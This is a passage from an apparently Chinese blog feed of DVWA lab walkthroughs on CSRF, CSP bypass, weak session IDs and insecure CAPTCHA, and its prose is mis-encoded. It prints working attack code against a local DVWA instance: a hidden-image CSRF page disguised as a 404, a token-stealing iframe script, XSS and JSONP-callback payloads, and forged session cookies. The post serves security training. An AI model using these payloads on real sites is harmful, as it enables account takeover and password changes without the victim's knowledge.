—å­ğŸŒğŸŒğŸŒï¼š</p><p>Aè¦æ±‡å…«ä¸‡ç»™Bï¼ŒAå¯ä»¥é€šè¿‡å¯¹é“¶è¡Œçš„ç½‘ç«™å‘é€è¯·æ±‚<code>http://bank/account=A&amp;amout=80000&amp;receive=B</code>(å‡è®¾)è¿™æ—¶å€™Cæƒ³å¾—åˆ°è¿™å…«ä¸‡ï¼Œä»–å°±å¯ä»¥å…ˆè‡ªå·±åšä¸€ä¸ªç½‘ç«™ï¼Œåœ¨ç½‘ç«™ä¸­æ”¾å…¥å¦‚ä¸‹ä»£ç ï¼š  <code>http://bank/account=A&amp;amount=80000&amp;receive=C</code>ï¼Œç„¶åé€šè¿‡å¹¿å‘Šæˆ–è€…é“¾æ¥è¯±ä½¿ A æ¥è®¿é—®ä»–çš„ç½‘ç«™ã€‚å½“ A è®¿é—®è¯¥ç½‘ç«™æ—¶ï¼Œä¸Šè¿° url å°±ä¼šä» A çš„æµè§ˆå™¨å‘å‘é“¶è¡Œï¼Œè€Œè¿™ä¸ªè¯·æ±‚ä¼šé™„å¸¦  Aæµè§ˆå™¨ä¸­çš„ cookie ä¸€èµ·å‘å‘é“¶è¡ŒæœåŠ¡å™¨ã€‚å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯·æ±‚ä¼šå¤±è´¥ï¼Œå› ä¸ºä»–ä¼šéªŒè¯ Açš„ä¿¡æ¯ï¼Œä½†å¦‚æœ A  å½“æ—¶æ°å·§åˆšè®¿é—®ä»–çš„é“¶è¡Œåä¸ä¹…ï¼Œä»–çš„æµè§ˆå™¨ä¸é“¶è¡Œç½‘ç«™ä¹‹é—´çš„ session å°šæœªè¿‡æœŸï¼Œæµè§ˆå™¨çš„ cookie ä¹‹ä¸­å«æœ‰ A çš„è®¤è¯ä¿¡æ¯ã€‚è¿™æ—¶ï¼Œ url è¯·æ±‚å°±ä¼šå¾—åˆ°å“åº”ï¼Œé’±å°†ä»Açš„è´¦å·è½¬ç§»åˆ°C çš„è´¦å·ï¼Œè€Œ Aä¸çŸ¥æƒ…ã€‚å³ä½¿Aå»é“¶è¡ŒæŸ¥è¯¢è®°å½•ï¼Œä¹Ÿåªèƒ½å‘ç°æœ‰ä¸€ä¸ªæ¥è‡ªäºä»–æœ¬äººçš„åˆæ³•è¯·æ±‚è½¬ç§»äº†èµ„é‡‘ã€‚ï¼ˆå°±å¾ˆæƒ¨ï¼Œä¸è¿‡ç°åœ¨çš„é“¶è¡Œçš„ç½‘ç«™åº”è¯¥æ²¡æœ‰è¿™ç§æ¼æ´å§ğŸ‘ğŸ‘ğŸ‘ï¼‰</p><p><strong>CSRFæ¼æ´æ£€æµ‹</strong></p><p>æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼Œå»æ‰Refererå­—æ®µåå†é‡æ–°æäº¤ï¼Œå¦‚æœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œåˆ™å­˜åœ¨CSRFæ¼æ´ã€‚ä¹Ÿå¯ä»¥å€ŸåŠ©å·¥å…·</p><p>æ£€æµ‹å·¥å…·:<code>CSRFTester</code>ï¼Œ<code>CSRF Request Builder</code>.</p><h1>low</h1><p><img src="/2021/02/03/dvwa6/1.jpg" alt="1"></p><p>æ²¡æœ‰é˜²å¾¡CSRF</p><p>åœ¨é¡µé¢æ›´æ”¹å¯†ç å‘ç°ç½‘å€<code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code>ä½†ä¸èƒ½ç›´æ¥æ”¾è¿™ä¸ªç½‘å€ï¼ˆå¯ä»¥ç”¨åœ¨çº¿å·¥å…·å°†ç½‘å€å˜çŸ­)å»è¯±å¯¼åˆ«äººç‚¹å‡»ï¼ˆè°é‚£ä¹ˆå‚»)æ‰€ä»¥è¦å§”å©‰ä¸€ç‚¹:</p><p>å…ˆåœ¨æˆ‘çš„è™šæ‹Ÿæœº(æ¨¡æ‹Ÿä¸€ä¸‹æ”»å‡»è€…çš„ä¸»æœº)ä¸Šå†™ä¸ªç½‘é¡µ:</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></code></pre><p>ç„¶åå†ç‰©ç†æœºä¸Šè®¿é—®å®ƒï¼ˆæ¨¡æ‹Ÿå—å®³è€…ï¼‰</p><p><img src="/2021/02/03/dvwa6/2.jpg" alt="2"></p><p>ç„¶åæŸ¥çœ‹ä¸€ä¸‹ç®¡ç†å‘˜çš„å¯†ç </p><p><img src="/2021/02/03/dvwa6/3.jpg" alt="3"></p><p>è§£ç </p><p><img src="/2021/02/03/dvwa6/4.jpg" alt="4"></p><p>å¯†ç å°±è¢«æ”¹è¾½ã€‚ä¹Ÿå¯ä»¥æŠ“åŒ…æ”¹ç½‘å€å¤„ç†</p><h1>medium</h1><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> )</code></pre><p>å¢åŠ äº†å¯¹ç”¨æˆ·è¯·æ±‚å¤´çš„ä¸­çš„Refererå­—æ®µçš„æ ¡éªŒï¼Œè¯·æ±‚å¤´ä¸­çš„Refererå­—æ®µå¿…é¡»åŒ…å«ä¸»æœºåœ°å€ã€‚</p><p><img src="/2021/02/03/dvwa6/7.jpg" alt="7"></p><p>åªè¦åŒ…å«äº†ä¸»æœºåœ°å€å°±å¯ä»¥ç»•è¿‡ï¼Œæ‰€ä»¥æ„é€ çš„æ–‡ä»¶åä¸ºï¼š<code>127.0.0.1.html</code>å³å¯ç»•è¿‡ã€‚ä¹Ÿå¯åœ¨burpä¸­<code>CSRF POC</code>æ¨¡å—ä¸­æ›´æ”¹ã€‚</p><h1>high</h1><p>ä»£ç åŠ å…¥äº†Anti-CSRF tokenæœºåˆ¶ï¼Œç”¨æˆ·æ¯æ¬¡è®¿é—®æ”¹å¯†é¡µé¢æ—¶ï¼ŒæœåŠ¡å™¨éƒ½ä¼šè¿”å›ä¸€ä¸ªéšæœºçš„tokenï¼Œå½“æµè§ˆå™¨å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéœ€è¦æäº¤tokenå‚æ•°ï¼Œè€ŒæœåŠ¡å™¨åœ¨æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šä¼˜å…ˆæ£€æŸ¥tokenï¼Œåªæœ‰tokenæ­£ç¡®ï¼Œæ‰ä¼šå¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼ˆä¹‹å‰ä»‹ç»è¿‡)tokenå€¼è¢«æ”¾åˆ°urlæœ€åã€‚æœ¬å…³è§£é¢˜å…³é”®æ˜¯åˆ©ç”¨ç”¨æˆ·çš„cookieå»ä¿®æ”¹å¯†ç çš„é¡µé¢è·å–å…³é”®çš„tokenã€‚æ„é€ ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œå¼•è¯±å—å®³è€…è®¿é—®(PS:è¿™ä¸ªæ”»å‡»ä»£ç æ˜¯å»æ•™ç¨‹copyçš„ï¼Œç­‰æˆ‘ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹JavaScriptåœ¨æ¥è‡ªå·±å†™ä¸€ä¸ª,ä¸è¿‡é‡Œé¢ç”¨åˆ°çš„å‡½æ•°ï¼Œæ ‡ç­¾ï¼Œè¯­æ³•åœ¨dvwa||XSSå’Œdvwa||CSP Bypasséƒ½è®²è¿‡äº†)</p><pre><code class="hljs pgsql">&lt;script <span class="hljs-keyword">type</span>=&quot;text/javascript&quot;&gt;    <span class="hljs-keyword">function</span> attack()&#123;        document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>;        document.getElementById(&quot;transfer&quot;).submit();     &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;    &lt;form <span class="hljs-keyword">method</span>=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_new&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_conf&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;user_token&quot; <span class="hljs-keyword">value</span>=&quot;&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;Change&quot; <span class="hljs-keyword">value</span>=&quot;Change&quot;&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><p>å› ä¸ºæµè§ˆå™¨ä¸å…è®¸è·¨åŸŸï¼Œè€Œç”¨æˆ·çš„æœåŠ¡å™¨åœ¨æœ¬åœ°ç«¯ï¼Œæ”»å‡»è€…åœ¨å¦ä¸€ä¸ªæœåŠ¡å™¨(æˆ‘çš„è™šæ‹Ÿæœºé‡Œ)ï¼Œå½“ç”¨æˆ·ä¸»åŠ¨å‘é€ä¿¡æ¯ç»™æ”»å‡»è€…çš„æœåŠ¡å™¨æ—¶ï¼Œæ”»å‡»è„šæœ¬æ‰å¯èƒ½è·å–tokenä»¤ç‰Œã€‚è¿™å°±è¦ç»“åˆä¹‹å‰å­¦çš„XSSè¾½ï¼Œåœ¨XSSçš„highä¸­è¾“å…¥ <code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt; </code>ï¼Œå³å¯è·å–tokenã€‚å‚è€ƒï¼š<a href="https://www.cnblogs.com/zhengna/p/12736823.html">high-ç»•è¿‡token</a>ã€‚</p><h1>impossible</h1><p>æœ¬å…³è¦æ±‚è¾“å…¥ä¹‹å‰çš„å¯†ç ï¼ŒCSRFå°±æœ‰ç‚¹å›°éš¾äº†ï¼Œé™¤éæ”»å‡»è€…èƒ½å¾—åˆ°ç”¨æˆ·å½“å‰å¯†ç ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSP Bypass</title>
    <link href="/2021/02/02/dvwa9/"/>
    <url>/2021/02/02/dvwa9/</url>
    
    <content type="html"><![CDATA[<p>Content-Security-Policyï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰æ˜¯æŒ‡HTTPè¿”å›æŠ¥æ–‡å¤´ä¸­çš„æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­å“ªäº›èµ„æºå¯ä»¥åŠ è½½æˆ–æ‰§è¡Œã€‚æ˜¯ä¸ºäº†ç¼“è§£æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼ˆXSSï¼‰åŸæ¥åº”å¯¹XSSæ”»å‡»æ—¶ï¼Œä¸»è¦é‡‡ç”¨å‡½æ•°è¿‡æ»¤ã€è½¬ä¹‰è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€æ ‡ç­¾ã€æ–‡æœ¬æ¥è§„é¿æ”»å‡»ã€‚CSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘äººå‘˜æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚å¼€å‘è€…åªéœ€è¦æä¾›é…ç½®ï¼Œå®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨å‰ç«¯æ·»åŠ ä¸€äº›æ ‡ç­¾ï¼Œå‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½è®¿é—®ã€‚æˆ‘ä»¬ä»Šå¤©è¦åšçš„å°±æ˜¯ç»•è¿‡ä»–ã€‚</p><h1>low</h1><p>æºç åˆ—äº†å‡ ä¸ªç™½åå•ç½‘ç«™</p><p><img src="/2021/02/02/dvwa9/8.jpg" alt="8"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨ç™½åå•ç½‘ç«™å†™jsä»£ç å¦‚<code>alert(111)</code>å¾—åˆ°<code>https://pastebin.com/5WMivnEr</code>ï¼Œåœ¨dvwaé¡µé¢è¿›è¡Œè®¿é—®ï¼Œç†è®ºä¸Šå°±ä¼šè¾¾åˆ°æ³¨å…¥æ•ˆæœï¼Œä½†æ˜¯ç°åœ¨çš„ç«ç‹å¥½åƒè¢«ä¿®å¤äº†</p><p><img src="/2021/02/02/dvwa9/9.jpg" alt="9"></p><p>å…¶å®è¿™å…³ä¹Ÿå¯ä»¥ç”¨CSRFå®ç°ï¼Œè¿˜æ˜¯ä¸€æ ·é€šè¿‡åšé’“é±¼ç½‘ç«™æ¥å®ç°ã€‚</p><h1>medium</h1><p><img src="/2021/02/02/dvwa9/1.jpg" alt="1"></p><p>æ„é€ ï¼š<code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot; &gt; alert('xss')&lt;/script&gt;</code><img src="/2021/02/02/dvwa9/2.jpg" alt="2" style="zoom: 50%;"></p><h1>high</h1><p><code>The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</code>é¡µé¢è°ƒç”¨äº†jsonp.php,è¯¥é¡µé¢å¯æ‰§è¡Œè‡ªå·±çš„ä»£ç </p><p>åœ¨é¡µé¢æºç ä¸­çœ‹åˆ°äº†</p><p><img src="/2021/02/02/dvwa9/3.jpg" alt="3"></p><p>æ‰“å¼€</p><p><img src="/2021/02/02/dvwa9/4.jpg" alt="4"></p><p>ä¸»è¦è§„åˆ’äº†ç‚¹å‡»æŒ‰é’®åçš„æ“ä½œï¼Œ<code>appendChildï¼ˆï¼‰</code>å¤„ç†çš„<code>jsonp.php</code>é‡Œå€’æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„å¤„ç†ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä»è¿™é‡Œè¦ä¼ å…¥çš„<code>callback</code>ä¸‹æ‰‹ï¼š</p><p>æ„é€ ï¼š<code>include=&lt;script src=&quot;source/jsonp.php?callback=alert('lisa');&quot;&gt;&lt;/script&gt;</code></p><img src="/2021/02/02/dvwa9/5.jpg" alt="5" style="zoom:50%;"><h1>impossible</h1><p><code>impossible.php</code>ï¼Œ<code>impossible.js</code>éƒ½å’Œhighæ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œå…³é”®åœ¨äº<code>appendChildï¼ˆï¼‰</code>å¤„ç†çš„<code>jsonp.php</code>å¤„ç†ä¸åŒï¼š</p><p>è¿™æ˜¯highçš„</p><p><img src="/2021/02/02/dvwa9/6.jpg" alt="6"></p><p>è¿™ä¸ªæ˜¯impossibleçš„</p><p><img src="/2021/02/02/dvwa9/7.jpg" alt="7"></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/linfangnan/p/13714694.html">DVWA é€šå…³æŒ‡å—ï¼šCSP Bypass(CSP ç»•è¿‡)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Weak Session IDs</title>
    <link href="/2021/02/01/dvwa8/"/>
    <url>/2021/02/01/dvwa8/</url>
    
    <content type="html"><![CDATA[<p>ç”¨æˆ·è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™ï¼Œåœ¨æœåŠ¡å™¨ç«¯ä¼šåˆ›å»ºä¸€ä¸ªä¼šè¯(Session)ï¼Œä¼šè¯ä¸­ä¼šä¿å­˜ç”¨æˆ·çš„çŠ¶æ€å’Œç›¸å…³ä¿¡æ¯ï¼Œç”¨äºæ ‡è¯†ç”¨æˆ·ã€‚æœåŠ¡å™¨ç«¯è®¤è¯æ—¶ï¼Œæµè§ˆå™¨éœ€è¦æŠŠå½“å‰ç”¨æˆ·æŒæœ‰çš„SessionIDå‘ŠçŸ¥æœåŠ¡å™¨ã€‚ç”¨æˆ·æ‹¿åˆ°session idå°±ä¼šåŠ å¯†åä¿å­˜åˆ° cookies ä¸Šï¼Œä¹‹ååªè¦cookieséšç€httpè¯·æ±‚å‘é€æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°±èƒ½è¯†åˆ«ç”¨æˆ·ã€‚å› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡çªƒå–ç”¨æˆ·SessionIDï¼Œä½¿ç”¨è¯¥SessionIDç™»å½•è¿›ç›®æ ‡è´¦æˆ·ã€‚</p><h1>low</h1><p>ç‚¹å‡»<code>Generate</code>ï¼Œ<code>Burpsuite</code>æŠ“åŒ…ï¼Œæ¯<code>go</code>ä¸€æ¬¡ï¼Œå“åº”ä¸­dvwasessionå°±åŠ ä¸€</p><p><img src="/2021/02/01/dvwa8/1.jpg" alt="1"></p><p>æ„é€ payload:<code>Cookie: dvwaSession=3; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=low</code></p><p>å³å¯åœ¨æ— å¯†ç æƒ…å†µä¸‹ç™»å½•åˆ°é¡µé¢</p><img src="/2021/02/01/dvwa8/2.jpg" alt="2" style="zoom: 33%;"><h1>medium</h1><img src="/2021/02/01/dvwa8/3.jpg" alt="3" style="zoom:50%;"><p>æ‰§è¡Œå‡ æ¬¡å‘ç°dvwasessionçš„å˜åŒ–ä¸æ—¶é—´æˆ³ä¸€è‡´ï¼Œåœ¨<a href="https://tool.lu/timestamp/">è½¬æ¢å·¥å…·</a>è¿›è¡Œè½¬æ¢å¯çŸ¥</p><p>æ„é€ <code>Cookie: dvwaSession=1612194327; PHPSESSID=e34amjsmbj3phlmuk0u17vd1p3; security=medium</code>ç™»å½•å³å¯</p><h1>high</h1><p>ä½¿ç”¨äº†PHP setcookie()å‡½æ•°è¿›è¡Œè®¾ç½®:</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs pgsql">setcookie(<span class="hljs-type">name</span>,<span class="hljs-keyword">value</span>,expire,<span class="hljs-type">path</span>,<span class="hljs-keyword">domain</span>,secure,httponly)</code></pre><pre><code class="hljs properties"> <span class="hljs-meta">å‚æ•°</span>              <span class="hljs-string">æè¿°</span><span class="hljs-attr">name</span>     <span class="hljs-string">å¿…éœ€ã€‚è§„å®šcookieçš„åç§°ã€‚</span><span class="hljs-attr">value</span>     <span class="hljs-string">å¿…éœ€ã€‚è§„å®šcookieçš„å€¼ã€‚</span><span class="hljs-attr">expire</span>   <span class="hljs-string">å¯é€‰ã€‚è§„å®šcookieçš„æœ‰æ•ˆæœŸã€‚</span><span class="hljs-attr">path</span>     <span class="hljs-string">å¯é€‰ã€‚è§„å®šcookieçš„æœåŠ¡å™¨è·¯å¾„ã€‚</span><span class="hljs-attr">domain</span>     <span class="hljs-string">å¯é€‰ã€‚è§„å®šcookieçš„åŸŸåã€‚</span><span class="hljs-attr">secure</span>     <span class="hljs-string">å¯é€‰ã€‚è§„å®šæ˜¯å¦é€šè¿‡å®‰å…¨çš„HTTPSè¿æ¥æ¥ä¼ è¾“cookieã€‚</span><span class="hljs-attr">httponly</span> <span class="hljs-string">å¯é€‰ã€‚è§„å®šæ˜¯å¦Cookieä»…å¯é€šè¿‡HTTPåè®®è®¿é—®ã€‚</span></code></pre><p><img src="/2021/02/01/dvwa8/4.jpg" alt="4"></p><p>æŠ“åŒ…åï¼Œå°†valueå€¼è¿›è¡Œé€†æ“ä½œï¼Œå†è§£å¯†æ„é€ payloadå³å¯ã€‚</p><h1>impossible</h1><p><img src="/2021/02/01/dvwa8/5.jpg" alt="5"></p><p>SHA-1æ˜¯ä¸€ç§æ•°æ®åŠ å¯†ç®—æ³•ï¼Œè¯¥ç®—æ³•çš„æ€æƒ³æ˜¯æ¥æ”¶ä¸€æ®µæ˜æ–‡ï¼Œç„¶åä»¥ä¸€ç§ä¸å¯é€†çš„æ–¹å¼å°†å®ƒè½¬æ¢æˆä¸€æ®µï¼ˆé€šå¸¸æ›´å°ï¼‰å¯†æ–‡ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºå–ä¸€ä¸²è¾“å…¥ç ï¼ˆç§°ä¸ºé¢„æ˜ å°„æˆ–ä¿¡æ¯ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬è½¬åŒ–ä¸ºé•¿åº¦è¾ƒçŸ­ã€ä½æ•°å›ºå®šçš„è¾“å‡ºåºåˆ—å³æ•£åˆ—å€¼ï¼ˆä¹Ÿç§°ä¸ºä¿¡æ¯æ‘˜è¦æˆ–ä¿¡æ¯è®¤è¯ä»£ç ï¼‰çš„è¿‡ç¨‹ã€‚</p><p>PSï¼šç°å®ä¸­åº”è¯¥æ²¡æœ‰è¿™ä¹ˆç®€å•çš„æ¼æ´å­˜åœ¨ï¼Œè¿™å¤„ç†æ–¹æ³•æœ‰ç‚¹è‰ç‡</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Insecure CAPTCHA</title>
    <link href="/2021/02/01/dvwa7/"/>
    <url>/2021/02/01/dvwa7/</url>
    
    <content type="html"><![CDATA[<p>Insecure CAPTCHAï¼Œä¸å®‰å…¨çš„éªŒè¯ç ï¼ŒCAPTCHAå…¨ç§°ï¼šCompletely Automated Public Turing Test to Tell Computers and Humans Apartã€‚éªŒè¯ç æµç¨‹ä¸€èˆ¬æ˜¯:ç”¨æˆ·å‘æµè§ˆå™¨çš„æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œæµè§ˆå™¨çš„æœåŠ¡å™¨è¿”å›éªŒè¯ç ç»™ç”¨æˆ·ï¼Œç”¨æˆ·å°†éªŒè¯ç å‘é€ç»™ç½‘ç«™æœåŠ¡å™¨ï¼Œç½‘ç«™æœåŠ¡å™¨ä¼šå‘æµè§ˆå™¨çš„æœåŠ¡å™¨éªŒè¯è¿™ä¸ªéªŒè¯ç çš„æ­£ç¡®æ€§ï¼Œæµè§ˆå™¨æœ€ç»ˆè¿”å›éªŒè¯ç»“æœç»™ç½‘ç«™æœåŠ¡å™¨ã€‚</p><p>æœåŠ¡å™¨é€šè¿‡è°ƒç”¨recaptcha_check_answerå‡½æ•°æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„æ­£ç¡®æ€§ã€‚</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">recaptcha_check_answer</span><span class="hljs-params">(<span class="hljs-variable">$privkey</span>,<span class="hljs-variable">$remoteip</span>, <span class="hljs-variable">$challenge</span>,<span class="hljs-variable">$response</span>)</span></span></code></pre><p>å‚æ•°$privkeyæ˜¯æœåŠ¡å™¨ç”³è¯·çš„private key ï¼Œ$remoteipæ˜¯ç”¨æˆ·çš„ipï¼Œ$challenge æ˜¯recaptcha_challenge_field å­—æ®µçš„å€¼ï¼Œæ¥è‡ªå‰ç«¯é¡µé¢ ï¼Œ$responseæ˜¯ recaptcha_response_field å­—æ®µçš„å€¼ã€‚å‡½æ•°è¿”å›ReCaptchaResponse classçš„å®ä¾‹ï¼ŒReCaptchaResponse ç±»æœ‰2ä¸ªå±æ€§ ï¼š</p><blockquote><p>$is_validæ˜¯å¸ƒå°”å‹çš„ï¼Œè¡¨ç¤ºæ ¡éªŒæ˜¯å¦æœ‰æ•ˆï¼Œ</p><p>$erroræ˜¯è¿”å›çš„é”™è¯¯ä»£ç ã€‚</p></blockquote><p>æˆ‘ä»¬çš„ç»•è¿‡ç®€è€Œè¨€ä¹‹å°±æ˜¯å½“éªŒè¯ä¸åˆæ ¼æ—¶ï¼Œé€šè¿‡burpæŠ“åŒ…å·¥å…·ä¿®æ”¹æˆç¬¦åˆè¦æ±‚çš„æ•°æ®åŒ…ã€‚ä¿®æ”¹å‚æ•°æ ‡å¿—ä½ã€USER-AGENTä¹‹ç±»çš„å‚æ•°ã€‚</p><h1>low</h1><img src="/2021/02/01/dvwa7/1.jpg" alt="1" style="zoom:67%;"><p>æºç ä¸­ç¬¬ä¸€æ­¥æ£€æŸ¥éªŒè¯ç è¿”å›è¡¨å•ï¼Œç¬¬äºŒæ­¥æ¥å—ç”¨æˆ·çš„è¡¨å•å†æ¥è¿›è¡Œä¿®æ”¹ã€‚æœåŠ¡å™¨ä»…ä»…é€šè¿‡æ£€æŸ¥Changeï¼Œstepå‚æ•°æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç»è¾“å…¥äº†æ­£ç¡®çš„éªŒè¯ç ã€‚æ•…æˆ‘ä»¬æŠ“åŒ…å°†stepå€¼ä¿®æ”¹ä¸º2å³å¯ç»•è¿‡éªŒè¯ã€‚ä¹Ÿå¯ä»¥ç”¨CSRFæ”»å‡»å®ç°ã€‚</p><p><img src="/2021/02/01/dvwa7/2.jpg" alt="2"></p><h1>medium</h1><p><img src="/2021/02/01/dvwa7/3.jpg" alt="3"></p><p>æœ¬è´¨ä¸Šä¸lowæ— åŒºåˆ«ï¼ŒæŠ“åŒ…æ—¶å¤šä¿®æ”¹ä¸€ä¸ª<code>passed_captcha</code>å€¼å³å¯</p><h1>high</h1><p><img src="/2021/02/01/dvwa7/4.jpg" alt="4"></p><p>$respå‚æ•°æœ‰æµè§ˆå™¨è¿”å›ï¼Œæˆ‘ä»¬åªèƒ½æ”¹å‚æ•°<code>recaptcha_response_fieldã€User-Agent</code></p><p><img src="/2021/02/01/dvwa7/5.jpg" alt="5"></p><h1>impossible</h1><p><img src="/2021/02/01/dvwa7/6.jpg" alt="6"></p><p>å¯¹è¿”å›å€¼å•ç‹¬éªŒè¯ï¼Œå¹¶ä¸”æœ¬å…³è¦è¾“å…¥å½“å‰å¯†ç ï¼Œ<code>Anti-CSRF token ,PDO</code>ä¹Ÿåœ¨ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/119692.html">InsecureCAPTCHA</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||File Inclusion&amp;File Upload</title>
    <link href="/2021/01/27/dvwa5/"/>
    <url>/2021/01/27/dvwa5/</url>
    
    <content type="html"><![CDATA[<h1>File Inclusion</h1><h2 id="æ–‡ä»¶åŒ…å«ä¸æ¼æ´"><a class="header-anchor" href="#æ–‡ä»¶åŒ…å«ä¸æ¼æ´">ğŸ­</a>æ–‡ä»¶åŒ…å«ä¸æ¼æ´</h2><p>å¼€å‘äººå‘˜å°†ç›¸åŒçš„å‡½æ•°å†™å…¥å•ç‹¬çš„æ–‡ä»¶ä¸­,éœ€è¦ä½¿ç”¨æŸä¸ªå‡½æ•°æ—¶ç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶,æ— éœ€å†æ¬¡ç¼–å†™,è¿™ç§æ–‡ä»¶è°ƒç”¨çš„è¿‡ç¨‹ç§°æ–‡ä»¶åŒ…å«ã€‚</p><p>æ–‡ä»¶åŒ…å«å‡½æ•°çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¹¶ä¸”å‚æ•°å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œè¿™æ ·å°±å¯èƒ½åŒ…å«éé¢„æœŸçš„æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸­å­˜åœ¨æ¶æƒ¹ä»£ç ï¼Œæ— è®ºæ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ï¼Œæ–‡ä»¶å†…çš„æ¶æ„ä»£ç éƒ½ä¼šè¢«è§£æå¹¶æ‰§è¡Œã€‚<br>æ–‡ä»¶åŒ…å«æ¼æ´å¯èƒ½ä¼šé€ æˆæœåŠ¡å™¨çš„ç½‘é¡µè¢«ç¯¡æ”¹ã€ç½‘ç«™è¢«æŒ‚é©¬ã€æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ç­‰å±å®³ã€‚</p><h2 id="æ–‡ä»¶åŒ…å«å¸¸ç”¨å‡½æ•°"><a class="header-anchor" 